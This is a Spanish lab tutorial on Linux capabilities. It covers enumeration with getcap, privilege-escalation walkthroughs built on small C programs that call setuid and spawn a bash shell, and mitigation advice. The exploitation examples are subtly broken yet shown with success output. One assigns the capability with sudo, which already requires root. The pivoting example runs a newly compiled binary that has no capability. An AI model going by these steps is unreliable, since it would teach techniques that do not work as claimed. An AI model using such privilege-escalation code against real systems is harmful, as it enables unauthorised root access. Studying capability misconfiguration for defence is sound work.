
---
# Laboratorio: Detección y explotación de Capabilities en Linux

---

## ¿Qué son las Linux Capabilities?

> Las *Linux Capabilities* son un mecanismo de control de privilegios más granular que el clásico modelo "todo o nada" del usuario `root`. Permiten dividir los privilegios del superusuario en unidades más pequeñas llamadas *capabilities*, que pueden asignarse a procesos o binarios individuales.

Esto permite que ciertos binarios tengan permisos limitados para realizar tareas privilegiadas sin necesidad de ejecutarse completamente como `root`.

---

## Tipos de capabilities

Las capabilities se agrupan en tres tipos:

- **Effective (`e`)**: Habilitadas actualmente para el proceso.
- **Permitted (`p`)**: El conjunto máximo de capabilities que el proceso puede habilitar.
- **Inheritable (`i`)**: Capabilities que pueden heredarse por procesos hijos.

---

## Riesgos de seguridad

Algunas capabilities pueden ser peligrosas si se asignan a binarios controlables o mal diseñados. Por ejemplo:

- `cap_net_raw`: permite crear paquetes raw → posible *sniffing* o spoofing.
- `cap_setuid`: permite cambiar el UID del proceso → posible escalada de privilegios.
- `cap_sys_admin`: muy poderosa, similar a `root`.

---

## Enumeración de capabilities

### Acción:

Buscar todos los binarios con capabilities asignadas:

```bash
getcap -r / 2>/dev/null
````

### Resultado ejemplo:

```bash
/usr/bin/ping = cap_net_raw+ep
/usr/local/bin/custom = cap_setuid+ep
```

### Explicación:

- El binario `ping` tiene acceso a paquetes raw.
    
- `custom` puede cambiar su UID, lo que podría explotarse para escalar a otro usuario o `root`.
    

---

## Ejemplo práctico: Escalada de privilegios con cap_setuid

Supongamos que encontramos un binario con la capability `cap_setuid+ep` asignada:

```bash
getcap /usr/local/bin/mi_binario
/usr/local/bin/mi_binario = cap_setuid+ep
```

Y verificamos que podemos ejecutarlo:

```bash
ls -l /usr/local/bin/mi_binario
-rwxr-xr-x 1 user user 123456 jun 14 10:00 /usr/local/bin/mi_binario
```

### Acción:

Creamos un binario personalizado que nos dé una shell con UID 0 (root):

```c
// shell.c
#include <unistd.h>
int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compilamos y asignamos la capability:

```bash
gcc shell.c -o shell
sudo setcap cap_setuid+ep ./shell
```

### Resultado:

```bash
./shell
# whoami
root
```

---

## Uso del comando `setcap` y `getcap`

### Asignar una capability a un binario:

```bash
sudo setcap cap_net_raw+ep /ruta/al/binario
```

### Ver capabilities asignadas:

```bash
getcap /ruta/al/binario
```

### Quitar capabilities:

```bash
sudo setcap -r /ruta/al/binario
```

---

## Pivoting entre usuarios usando capabilities

### Escenario:

Un binario tiene `cap_setuid` y es ejecutable por nuestro usuario, pero pertenece a otro usuario del sistema (`backup`, por ejemplo):

```bash
ls -l /usr/local/bin/switch_user
-rwxr-xr-x 1 backup backup 123456 jun 14 10:00 /usr/local/bin/switch_user
getcap /usr/local/bin/switch_user
/usr/local/bin/switch_user = cap_setuid+ep
```

### Acción:

Creamos un binario que cambie al UID de `backup` (o de `root`, si no hay restricciones adicionales):

```c
#include <unistd.h>
int main() {
    setuid(1002); // UID de backup
    system("/bin/bash");
    return 0;
}
```

Compilamos y ejecutamos:

```bash
gcc -o jump jump.c
./jump
```

### Resultado:

```bash
$ whoami
backup
```

Hemos pivoteado a otro usuario aprovechando una capability mal configurada.

---

## Recomendaciones y mitigación

- **Auditar regularmente** el sistema con `getcap -r /` para detectar binarios con capabilities asignadas.
    
- **Evitar asignar capabilities peligrosas** (`cap_setuid`, `cap_sys_admin`, etc.) a binarios no verificados.
    
- **Usar mecanismos MAC** como AppArmor o SELinux para limitar aún más lo que puede hacer un binario, incluso con capabilities.
    
- **Eliminar capabilities no necesarias** con `setcap -r`.
    
- Supervisar usuarios con permisos para asignar capabilities (`sudo`, `setcap`).
    

---

## Herramientas útiles

- `getcap`: lista capabilities asignadas.
    
- `setcap`: asigna o elimina capabilities.
    
- `capsh --print`: imprime las capabilities actuales de la shell.
    
- `pscap`: herramienta para visualizar capabilities de procesos en tiempo real (requiere instalación).
    

---

## Resumen

Las Linux Capabilities pueden mejorar la seguridad cuando se usan correctamente, pero también pueden ser explotadas para obtener privilegios elevados si se aplican mal. La revisión y auditoría periódica de estas configuraciones es una práctica esencial para mantener un entorno Linux seguro.

---
